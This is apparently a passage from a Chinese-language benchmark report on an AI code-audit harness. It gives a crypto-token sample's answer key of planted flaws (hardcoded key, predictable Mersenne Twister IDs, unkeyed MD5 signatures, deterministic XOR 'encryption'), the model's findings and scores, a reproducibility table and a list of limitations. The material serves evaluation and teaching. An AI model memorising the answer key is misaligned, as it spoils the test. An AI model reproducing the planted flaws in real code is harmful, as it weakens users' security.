未记录的疑点：query 的 fetchall() 全量载入内存缺乏数据量证据，export 中途失败残留半截文件影响有限，均未达到发现标准。没有实际运行代码或测试来复现注入与文件写入，结论基于静态阅读，注入与文件写入的可利用性依赖于该服务是否直接暴露给不可信输入（handler.py 显示参数正是来自 request）。
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s7-crossfile-flow\repo \
  -g "审查 app/repository.py 里的 query 与 export 两个方法。" \
  --out reports/s7-crossfile-flow.md --json reports/s7-crossfile-flow.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s8-crypto-protocol"></a>

### L8 专家　`s8-crypto-protocol`

- 考的能力：**诊断型（先立安全目标）**
- 审计根：`examples\s8-crypto-protocol\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 5 条标注
- 本次实测：8 轮 / 91s / 结束原因 `finished` / 缓存命中 82%
- 结果：召回 60%（3/5）　精确率 60%　F1 60%

**审计目标（提问原文）**

```text
先说明这套令牌方案应当达成的安全目标（不可预测、不可伪造、不可重放、机密性），再逐项判断实现是否达成。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `CRYPTO01-a` | `app/tokens.py:7` | 签名密钥硬编码，且是低熵的固定字符串 |
| `CRYPTO02-a` | `app/tokens.py:12` | Mersenne Twister 可预测，观测若干输出即可推后续值 |
| `CRYPTO03-a` | `app/tokens.py:18` | MD5 已被攻破且此处未加盐，可构造碰撞 |
| `CRYPTO04-a` | `app/tokens.py:26` | 字符串比较非常量时间（可做时序侧信道），且完全没用 public_key，等于不验签 |
| `CRYPTO05-a` | `app/tokens.py:34` | 固定密钥流异或，相同明文恒定得到相同密文（确定性），且长度小于 32 字节时密钥流被复用 |

规则基线命中 1 条，召回 20%（精确率 100%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 6 条）**

1. `app/tokens.py:18` [blocker] **签名是无密钥的裸 MD5，任何人都能伪造合法令牌（不可伪造性失效）**　`复核: merged`
   - `sign()` 里签名的计算是 `hashlib.md5(body.encode())`，完全没有任何密钥参与；文件顶部定义的 `SIGNING_SECRET`（L7）在全文件中从未被引用。因此"签名"只是载荷的公开哈希：任何拿到令牌的人都可自行构造 body 并用同样算法算出 digest，拼成 `body.digest` 即可通过校验。验证侧同样无密钥：`verify(token, public_key)`（L22）签名要求传入 `public_key`，但函数体（L24-26）只做 md5 重算，`public_key` 参数从未被使用，所以调用方以为在做非对称/带密钥校验，实际上校验对攻击者完全透明。此外 MD5 本身已不具备抗碰撞性，即便将来补上密钥，`md5(secret + body)` 这类拼接也不是安全的 MAC，必须用 HMAC-SHA256 或 Ed25519 等签
2. `app/tokens.py:12` [blocker] **会话 ID 用非密码学随机数 random 生成，可被预测（不可预测性失效）**　`复核: hit`
   - `random.randint(10**15, 10**16 - 1)` 使用的是 Mersenne Twister（MT19937），属于统计用伪随机数发生器，不是 CSPRNG：其内部状态可由少量连续输出完整还原（状态 624 个 32 位字），之后所有历史与未来的输出都可被推算。同时取值空间只有 9×10^15 ≈ 2^53 个可能值，远低于会话标识应具备的熵（对无速率限制的在线猜测也不够）。触发条件：会话标识若被用作会话认证凭据（这是本函数名与模块用途所暗示的），攻击者先取得任意几次会话标识即可预测他人的 ID，从而接管会话。注意：当前工作区内除本文件外没有其他调用点（grep 无结果），所以影响面取决于上层如何消费该 ID，这一点无法在本仓库内进一步验证。
3. `app/tokens.py:31` [blocker] **encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立**　`复核: placement`
   - `stream = hashlib.sha256(key).digest()` 把密钥确定性派生为一段 32 字节的密钥流，随后 L33 用 `stream[index % len(stream)]` 循环异或明文。由此产生三个确定的问题：(1) 密钥流可复用且无 nonce/IV —— 同一 key 下相同明文永远得到相同密文（确定性加密，等价于 ECB），密文本身即成为明文的指纹；(2) 密钥流只对 (key, 位置) 敏感，与明文无关，因此两个密文的异或等于两个明文的异或，已知明文可即时解出同位置的未知明文；(3) 超过 32 字节的字段会回到起点重复密钥流，长字段的异或差分同样泄露明文；(4) 这是纯异或流密码且无认证标签，密文可被逐位篡改而不会被察觉。函数名与"加密"语义（docstring 写"混淆"）会让调用方以为敏感字段受到了保护。触发条件：只要该函数被用于真实敏感字段（这
4. `app/tokens.py:15` [warn] **令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失**　`复核: key_gap`
   - 令牌格式是 `body + "." + digest`（L17-19），body 只是调用方传入的 payload；`sign()` 不注入任何签发时间、过期时间或一次性标识（jti/nonce）。验证侧 `verify()` 的返回类型是 bool（L22），函数体只做摘要比对（L25-26），既不解析 payload 里的声明，也没有任何时间参数或「已使用标识」存储的入口——也就是说，即使调用方在 payload 里自带了 exp，本模块自身也永远不会因为令牌过期而拒绝它。只要令牌被第三方捕获（典型途径：日志、Referer/URL 泄露、传输未加密、被攻破的存储），它可以被无限期原样重放。定级说明：模块层面重放防护完全缺失，但"是否可重放"最终取决于上层是否额外自行解析 body 并校验时效，而当前工作区内除本文件外没有任何调用点（grep `sign(`/`verify(` 仅命中
5. `app/tokens.py:24` [warn] **签名按首个 '.' 切分，payload 含 '.' 时合法令牌会被自身 verify 拒绝**　`复核: key_gap`
   - `sign()` 用 `body + "." + digest` 拼接，而 `verify()` 用 `token.partition(".")` 按**第一个** '.' 切分：只要 body 里出现 '.'，校验时得到的 body 就会被截断，重算的摘要必然与原摘要不同，于是 sign() 自己签发的合法令牌会被 verify() 拒绝。触发条件是 payload 的任意字符串值或浮点数字里含 '.'，例如 `sign({"email": "a.b@x.com"})` 生成的令牌 verify 恒为 False（`json.dumps` 不会转义字符串中的 '.'）。这不是安全性问题而是可用性/自相矛盾问题：签发端与校验端对同一令牌的解析不一致，任何带域名、版本号（"v1.2"）、URL、小数的字段都会导致认证失败，且失败原因是静默返回 False，排查成本高。
6. `app/tokens.py:26` [note] **摘要比对使用非常量时间的 ==，修复密钥化 MAC 后会成为侧信道**　`复核: partial`
   - L26 用 Python 的 `==` 比较两个十六进制摘要字符串，其比较过程在首个不相等字符处提前返回，耗时与「匹配前缀长度」相关，理论上可按字节爆破摘要。重要限定：在当前实现下这条并不构成可利用漏洞，因为摘要计算不含密钥（见 L18 的发现），攻击者本来就能直接算出正确摘要；本条是修复 L18 之后必须一并处理的加固项——一旦换成 `hmac.compare_digest`（常量时间）以外的带密钥校验，`==` 的提前返回就会成为唯一的侧信道。因此按 note 记录，不夸大其当前影响。

**漏报**

- `CRYPTO01-a` @ `app/tokens.py:7` — 签名密钥硬编码，且是低熵的固定字符串
  - 模型在 `app/tokens.py:12` 报了一处，相距 5 行：会话 ID 用非密码学随机数 random 生成，可被预测（不可预测性失效） → **大概率是同一处缺陷的位置分歧**
- `CRYPTO05-a` @ `app/tokens.py:34` — 固定密钥流异或，相同明文恒定得到相同密文（确定性），且长度小于 32 字节时密钥流被复用
  - 模型在 `app/tokens.py:31` 报了一处，相距 3 行：encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立 → **大概率是同一处缺陷的位置分歧**

**多报（含位置分歧的判断）**

- `app/tokens.py:31` [blocker] encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立
  - 最近标注：`CRYPTO05-a` @ `app/tokens.py:34`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）
- `app/tokens.py:15` [warn] 令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失
  - 最近标注：`CRYPTO02-a` @ `app/tokens.py:12`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）

**冗余（重复报告同一处缺陷）**

- `app/tokens.py:26` [note] 摘要比对使用非常量时间的 ==，修复密钥化 MAC 后会成为侧信道

> 冗余不计入精确率分子分母 —— 重复描述同一缺陷是啰嗦，不是报错。

**模型自己的收尾总结（原文摘录）**

```text
## 审计范围

工作区只有一个文件 `app/tokens.py`（34 行），已逐行读完；另用 grep 对整个工作区检索了 `SIGNING_SECRET / sign( / verify( / encrypt_field / new_session_id`，确认这些符号除本文件外没有其他调用点。`run_command` 被高风险权限策略拦截（工具返回 HighRiskBlocked），因此本次结论均为静态阅读所得，凡涉及「上层如何消费」的部分我都显式标注为未验证。仓库根不是 git 仓库，`git diff` 返回的是无关的 backend/eval 变更，与本次审计目标无关，已排除。

## 四个安全目标的达成情况：全部未达成

**1. 不可预测 —— 未达成（blocker）**
`new_session_id()`（L12）用 `random.randint` 生成会话标识。random 是 MT19937，不是 CSPRNG，状态可由少量输出还原；取值空间也仅约 2^53。攻击者拿到几次会话标识即可预测他人的 ID。应改 `secrets.token_urlsafe(32)`。

**2. 不可伪造 —— 未达成（blocker）**
这是最严重的一条。`sign()`（L18）的「签名」是 `md5(body)`，**没有任何密钥参与**；L7 定义的 `SI
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s8-crypto-protocol\repo \
  -g "先说明这套令牌方案应当达成的安全目标（不可预测、不可伪造、不可重放、机密性），再逐项判断实现是否达成。" \
  --out reports/s8-crypto-protocol.md --json reports/s8-crypto-protocol.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

## 六、可复现性（同一输入重跑多次）

动机：公开测评显示，同一个 PR 重跑三次，首轮验证为真的发现只在两次重复中复现了 7/15。
也就是说单次跑分是观测值。下表是对两个样本各跑三次的结果：

| 样本 | 标注 | 召回（三次） | 召回均值 | 召回波动 | 精确率（三次） | 精确率波动 | 发现条数（三次） |
|---|---|---|---|---|---|---|---|
| `s1-obvious-danger` | 5 | 80%, 80%, 80% | 80% | ±0pt | 100%, 80%, 100% | ±20pt | [4, 5, 4] |
| `s6-authz-logic` | 4 | 100%, 100%, 100% | 100% | ±0pt | 80%, 67%, 67% | ±13pt | [6, 7, 6] |

**怎么用这个表**：波动大的样本，单次跑出来的任何数字都不该被引用。
要做模型选型，先按 `python -m eval.run_bench --repeats 3` 的方式把每个候选跑 3~5 次，
比较**均值与波动**，而不是比一次跑分。

> 更早还有一轮独立的重复实验（`eval/variance-round1.json`，汇总格式），
> 那一轮里 `s6-authz-logic` 的召回是 `100% → 100% → 50%`。
> 该文件在一次仓库清理中被当作中间产物删除，这里保存结论、不再给表 ——
> 需要完整数据的话按下面的命令重跑即可（结果不会完全相同，这本身就是结论）。

---

## 七、这份靶场的已知局限

如实列出，避免把结论用超范围。

1. **样本量小**。8 个样本 / 34 条标注，够用来看「难度梯度长什么样」，**不够用来选模**。要分辨 2~3 个百分点的差异，需要上百题量级。
2. **答案键不完整**。人工复核发现 6 处模型报出的真缺陷没有进标注集（`s2` 的 CSV 注入、`s6` 的 `cancel` 越权与 `can_view` 从未被调用、`s7` 的任意文件写入与 `return 0`、`s8` 的 `'.'` 切分不对称）。也就是说这套靶场的**自动精确率系统性低估**了模型 —— 而按「模型没报的算漏报」定义出来的召回率也可能低估。答案键应由独立于作者的人补全后重跑。
3. **标注与规则出自同一作者同一批代码**，天然偏向「正则能表达」的缺陷，会让规则基线显得比实际强。
4. **每个样本的提问方式不同**（这是刻意的：要看提问方式的影响），所以横向比较召回率时，差异里混着「难度」和「提问方式」两个因素。
5. **判官是我自己，不是独立第三方**。复核口径的每个数字都建立在第四节那张判定表上，而我对模型的产出会有系统性宽容（例如把「设计层面的缺失」判成 `key_gap` 而不是 `partial`）。要注意**自动口径里的距离分类本身不可靠**：`s2` 的 CSV 注入离最近的标注只有 3 行却
   是完全不同的缺陷，`s7` 的任意文件写入被算成了「冗余」。这两类错判都会让数字偏离真相。
6. **未开高风险权限**：`run_command` / `run_tests` 全程被护栏拒绝，所以「资源泄漏」「并发」类结论是基于代码结构的静态推断，没有运行时确认。需要运行时证据加 `--allow-high-risk`。
7. **单模型**：只测了 `deepseek-flash`。难度分档是否跨模型单调，本文档回答不了。
8. **每个样本只跑了 1 次**（可复现性一节单独跑了 2 个样本 × 3 次）。总览表里的行是单次观测，波动见第六节。

